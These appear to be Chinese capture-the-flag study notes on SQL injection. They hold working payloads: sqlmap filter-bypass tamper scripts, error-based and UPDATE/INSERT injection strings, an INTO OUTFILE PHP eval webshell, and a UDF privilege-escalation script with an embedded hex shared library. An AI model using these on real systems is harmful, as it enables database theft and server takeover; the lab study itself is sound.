指定攻击载荷的篡改脚本<br />[tamper介绍](https://y4er.com/posts/sqlmap-tamper/#%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8Dtamper)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1667549388191-53a2efe6-9135-4cde-8bca-fe31de58be9e.png#averageHue=%23f5f4f4&clientId=u9b62095b-5164-4&from=paste&height=524&id=uc01b6c4a&originHeight=1048&originWidth=1740&originalType=binary&ratio=1&rotation=0&showTitle=false&size=77097&status=done&style=none&taskId=uc6928128-7d11-4289-a433-561cf4d8913&title=&width=870)

- 这里对空格进行了过滤，因此可以指定一个脚本，如space2comment，将空格转为注释
- 可以在sqlmap的tamper目录下查看space2comment的源码，也可以将自己写的绕过放到该目录下

```shell
--tamper = "space2comment"
```

##### 过滤select

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1667550743488-35a9e1ef-669e-4825-a070-e17a447afd43.png#averageHue=%23f4f3f3&clientId=u9b62095b-5164-4&from=paste&height=307&id=u51453900&originHeight=613&originWidth=1663&originalType=binary&ratio=1&rotation=0&showTitle=false&size=50869&status=done&style=none&taskId=u026bb624-42ad-41c4-9cc2-7f083b1085a&title=&width=831.5)

- 这里过滤了空格，且替换了select，正常需要双写绕过

```shell
-v 6//查看详细的测试信息，从1-6
```

- 查看测试信息，发现没有用小写的select，因此也就不用绕过，直接--tamper=space2comment就可以查出结果

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1667550919048-09008d29-3440-41f0-9ff9-dfc5b7e34f86.png#averageHue=%232f323c&clientId=u9b62095b-5164-4&from=paste&height=526&id=u40417816&originHeight=1051&originWidth=2384&originalType=binary&ratio=1&rotation=0&showTitle=false&size=272259&status=done&style=none&taskId=u0495a0f2-a854-4099-9ef8-56f030bd8d9&title=&width=1192)

##### 过滤=,* ，空格

- 仍然用前面学习的方法绕过，只不过改一下放到脚本中
- 用0a绕过空格，用like绕过=，用1绕过*(主要针对count(*)这种情况)

```python
#!/usr/bin/env python
from lib.core.compat import xrange
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    retVal = payload

    if payload:
        retVal = ""
        quote, doublequote, firstspace = False, False, False

        for i in range(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += chr(0x0a)
                    continue

            elif payload[i] == '\'':
                quote = not quote

            elif payload[i] == '"':
                doublequote = not doublequote
            
            elif payload[i] == "*":
                retVal += chr(0x31)
                continue

            elif payload[i] == "=":
                retVal += chr(0x0a)+'like'+chr(0x0a)
                continue

            elif payload[i] == " " and not doublequote and not quote:
                retVal += chr(0x0a)
                continue

            retVal += payload[i]

    return retVal

```

也可以直接把上述代码简化

```python
def tamper(payload, **kwargs):
    retVal =payload
    if payload:
        retval = retVal.replace ("COUNT(* ) ", "COUNT ( id) ")
        retval = retval.replace (" ", chr(0x0a))
        retVal = retVal.replace ("=", chr (0x0a)+"like" + chr(0x0a))
    return retval
```

#### --os-shell 

- 直接在上面的基础上，不再用--current-db一步一步获取信息，直接--os-shell，getshell

### limit注入(mysql)

[https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html](https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html)

- 在LIMIT后面可以跟两个函数，PROCEDURE 和 INTO，into需要写权限，一般不常见，但是PROCEDURE在msyql5.7以后已经弃用，8.0直接删除

[https://www.docs4dev.com/docs/zh/mysql/5.7/reference/xml-functions.html#function_extractvalue](https://www.docs4dev.com/docs/zh/mysql/5.7/reference/xml-functions.html#function_extractvalue)

#### 报错注入

<br />

- SELECT ExtractValue('<a><b><b/></a>', '/a/b'); 就是寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误的话，就会报错

```sql
SELECT ExtractValue('<a><b><b/></a>', '~')
```

#### procedure analyse

- 用于优化表结构

```sql
procedure analyse(1,1)
```

#### payload

```sql
URL/api/?page=1&limit=1 procedure analyse(extractvalue(rand(),concat(0x3a,database())),1)
```

#### 

### group by

```sql
select * from user group by 1
```

- group by 1的意思就是根据查询结果的第一列的名称返回，假设表的列依次是id, username, password，那么等同于group by id

#### 注入方法

- 时间盲注，直接在后面构造语句爆破信息

```sql
select * from user group by (if(2 > 1, sleep(1), 1))
```

### 查看存储过程

[https://blog.csdn.net/qq_41573234/article/details/80411079](https://blog.csdn.net/qq_41573234/article/details/80411079)

- 如果找遍了mysql的字段，都找不到flag，那就查看存储过程

```sql
SELECT * FROM information_schema.Routines
```

- information_schema  数据库中的  Routines  表中，存储了所有存储过程和函数的定义

### Update注入

#### 特点

[https://www.cnblogs.com/duanxz/p/5099030.html](https://www.cnblogs.com/duanxz/p/5099030.html)

- 不能先select出同一表中的某些值，再update这个表(在同一语句中)

```sql
update user set username=(select username from user where username = 'a') where username = 'admin';
```

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1667917082676-c061816c-1cd2-41af-886a-dc0bb783e4d2.png#averageHue=%23febfca&clientId=ud0e0dd54-715e-4&from=paste&height=197&id=u5ec08c7c&originHeight=393&originWidth=1142&originalType=binary&ratio=1&rotation=0&showTitle=false&size=33691&status=done&style=none&taskId=u40eacd15-0903-4e6d-99e3-6bd39b887c6&title=&width=571)

#### payload

#### 0x01：

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1667917137648-bdfa82fd-a7f1-4648-9343-bb3eed368313.png#averageHue=%23f6f6f5&clientId=ud0e0dd54-715e-4&from=paste&height=280&id=ub22fcc55&originHeight=560&originWidth=1647&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28044&status=done&style=none&taskId=u2d598940-e9d2-41f7-ac62-f4c6a82e31b&title=&width=823.5)

```sql
pass = 1}',username = (select group_concat(table_name) from 
information_schema.tables where table_schema=database()) where 1=1# 
&username = ctfshow
```

- 这里注意要写where 1=1 ，符合update的语法，找到要更新的值
- 要提交username参数

#### 0x02：子查询

```sql
pass = 1}',username = (select a from (select group_concat(table_name)a from 
information_schema.tables where table_schema=database())b) where 1=1# 
&username = ctfshow
```

- 给table_name一个别名a
- 将`select group_concat(table_name)a from information_schema.tables where table_schema=database()`的结果作为b，b是a的集合
- 从b中查询a

#### 0x03 \

- \闭合，详见神奇闭合

### Insert注入

```sql
 $sql = "insert into ctfshow_user(username,pass) value('{$username}','{$password}')";

```

payload:

```sql
username=1,(select xxxx)');#&password=1 
```

#### sql语句还可以是这样的

```sql
 sql = "insert into comment
            set category = '$category',
                content = '$content',
                bo_id = '$bo_id'";
```

payload

```sql
category=1',content=(select database()),/*&content=*/#
```

#### web 240

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668324721593-70f2748c-6e0b-4489-901a-d6d288a41fba.png#averageHue=%23f6f6f6&clientId=uf1083ba2-7248-4&from=paste&height=259&id=u73539723&originHeight=518&originWidth=1670&originalType=binary&ratio=1&rotation=0&showTitle=false&size=34528&status=done&style=none&taskId=ub338bac3-7559-41cb-836e-be5ae1e88c6&title=&width=835)

- 这个题过滤的东西太多，只能根据提示猜，

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668324758627-5e7f5300-9734-4b96-b51a-e143adf14f5d.png#averageHue=%23fefefe&clientId=uf1083ba2-7248-4&from=paste&height=92&id=u0eb81d81&originHeight=183&originWidth=1124&originalType=binary&ratio=1&rotation=0&showTitle=false&size=23921&status=done&style=none&taskId=ud7693272-35ae-4f19-96a5-cee480c7af6&title=&width=562)

- 脚本爆破：

```python
import random
import requests

url = "http://b82a605d-0bcc-4005-9b7b-9562403f5848.challenge.ctf.show"
url_insert = url + "/api/insert.php"
url_flag = url + "/api/?page=1&limit=1000"


# 看命函数
def generate_random_str():
    sttr = 'ab'
    str_list = [random.choice(sttr) for i in range(5)]
    random_str = ''.join(str_list)
    return random_str


while 1:
    data = {
        'username': f"1',(select(flag)from(flag{generate_random_str()})))#",
        'password': ""
    }
    r = requests.post(url_insert, data=data)
    r2 = requests.get(url_flag)
    if "ctfshow" in r2.text:
        print(r2.json()['data'])
        exit()
        for i in r2.json()['data']:
            if  "ctfshow" in i['pass']:
                print(i['pass'])
                break
        break
```

### delete 注入

- or时间盲注

### file注入

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668347102203-b86ae7e5-18e8-452f-8433-ff641c0dff9f.png#averageHue=%23f7f6f6&clientId=ue81eccc3-ef11-4&from=paste&height=280&id=udba6c2f2&originHeight=560&originWidth=1692&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28503&status=done&style=none&taskId=uee1a8342-7825-48df-82d9-18756cda4ce&title=&width=846)

- 查询官方文档可知

```sql
SELECT ... INTO OUTFILE 'file_name'
        [CHARACTER SET charset_name]
        [export_options]
 
export_options:
    [{FIELDS | COLUMNS}
        [TERMINATED BY 'string']//分隔符
        [[OPTIONALLY] ENCLOSED BY 'char']
        [ESCAPED BY 'char']
    ]
    [LINES
        [STARTING BY 'string']
        [TERMINATED BY 'string']
    ]

/***********************************************************/

“OPTION”参数为可选参数选项，其可能的取值有：
 
`FIELDS TERMINATED BY '字符串'`：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\t”。
 
`FIELDS ENCLOSED BY '字符'`：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。
 
`FIELDS OPTIONALLY ENCLOSED BY '字符'`：设置字符来括住CHAR、VARCHAR和TEXT等字符型字段。默认情况下不使用任何符号。
 
`FIELDS ESCAPED BY '字符'`：设置转义字符，只能为单个字符。默认值为“\”。
 
`LINES STARTING BY '字符串'`：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。
 
`LINES TERMINATED BY '字符串'`：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\n”。
```

重要的思想：在php页面中导入一句话木马，即可getshell

- 因此，可以设置FIELDS TERMINATED BY 一句话木马

```sql
filename=1.php' FIELDS TERMINATED BY '<?php eval($_POST[1]);?>'
```

#### 过滤php

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668350978842-33b128c4-6ba5-4981-a671-0cfb8a7bbd28.png#averageHue=%23f6f6f5&clientId=ue81eccc3-ef11-4&from=paste&height=221&id=u8a3b30a7&originHeight=441&originWidth=1627&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24938&status=done&style=none&taskId=u6cc61ebb-7d6e-41af-86f9-d74023fa69f&title=&width=813.5)

- 这里先创建.user.ini，.user.ini文件中，；表示注释，且要让auto_prepend_file=1.jpg单独一行

```sql
filename=.user.ini' lines starting by ';' terminated by 0x0a6175746f5f70726570656e645f66696c653d312e6a70670a;#
//也就是如下语句，只不过在`auto_prepend_file=1.jpg`前后加了%0a用于换行，保证注入的内容单独在一行
filename=.user.ini' lines starting by ';' terminated by "auto_prepend_file=1.jpg"#
```

- 注意是在lines的结尾加了auto_prend_file，所以要在字符串前后都要加0a

注意点：字符串可用16进制表示

- 创建1.jpg

### 报错注入

#### updatexml

- updatexml(xml_doument,XPath_string,new_value)
- xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，也就是使用路径去定义一个元素
- 只需要构造错误的XPath_string，concat的第一个参数可以换成0x7e(~)等

```sql
//查表名
/?id=' or updatexml(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) -- A
//查列名
/?id=' or updatexml(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flag')),1) -- A
//查数据(因为报错信息长度有限，所以要分段读取)
/?id=' or updatexml(1,(select right(flag,30) from ctfshow_flag limit 0,1),1) -- A
```

#### extractvalue()

```sql
//查表名
/?id=1' or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)); -- a
//查列名
/?id=1' or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagsa'),0x7e)); -- a
//查数据(因为报错信息长度有限，所以要分段读取)
/?id=1' or extractvalue(1,concat(0x7e,(select right(flag1,30) from ctfshow_flagsa),0x7e)); -- a
```

- extractvalue()能查询字符串的**最大长度为32**，就是说如果我们想要的结果超过32，就需要用substring()函数截取

#### floor()

[https://www.cnblogs.com/wzy-ustc/p/14217750.html](https://www.cnblogs.com/wzy-ustc/p/14217750.html)

- floor()返回不大于x的最大整数值

```sql
//查表名
/?id=1' union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e,floor(rand()*2))a from information_schema.tables group by a-- A
//查列名
/?id=1' union select 1,count(*),concat((select column_name from information_schema.columns where table_name='ctfshow_flags' limit 1,1),0x7e,floor(rand()*2))a from information_schema.tables group by a-- A
//查数据
/?id=1' union select 1,count(*),concat((select flag2 from ctfshow_flags),0x7e,floor(rand()*2))a from information_schema.tables group by a-- A
```

#### Ceil或round

- 使用ceil()(向上取整)代替floor()。当然也可以使用round()：
- ROUND(X) – 表示将值 X 四舍五入为整数，无小数位
- ROUND(X,D) – 表示将值 X 四舍五入为小数点后 D 位的数值，D为小数点后小数位数。若要保留 X 值小数点左边的 D 位，可将 D 设为负值

#### 时间盲注-yyds

### udf提权

[https://www.k0rz3n.com/2018/10/21/Mysql%20%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/#%E4%B8%89%E3%80%81MYSQL-UDF-%E6%8F%90%E6%9D%83](https://www.k0rz3n.com/2018/10/21/Mysql%20%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/#%E4%B8%89%E3%80%81MYSQL-UDF-%E6%8F%90%E6%9D%83)

- 全称是 **User defined function**(用户自定义函数)，对基础权限要求很高的，要求数据库 root 权限
- 当我们有读取和写入权限以后，我们就可以尝试使用 udf 提权的方法，从数据库的 root 权限提升到 系统的管理员权限

```python
#参考脚本
#环境：Linux/MariaDB
import requests
 
url='http://6a4ab9f6-0c09-45b7-ad8c-280e5f9ce6e9.challenge.ctf.show/api/?id='


code='7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400